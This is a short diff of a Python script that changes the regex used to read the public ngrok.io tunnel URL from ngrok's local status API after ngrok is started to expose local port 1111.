@@ -254,7 +254,7 @@ def runPEnv():
 def runNgrok():
     system('./Server/ngrok http 1111 > /dev/null &')
     sleep(10)
-    system('curl -s -N http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
+    system('curl -s -N http://127.0.0.1:4040/status | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
     print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.read() + '{1}').format(CYAN, END, GREEN)
     url.close()
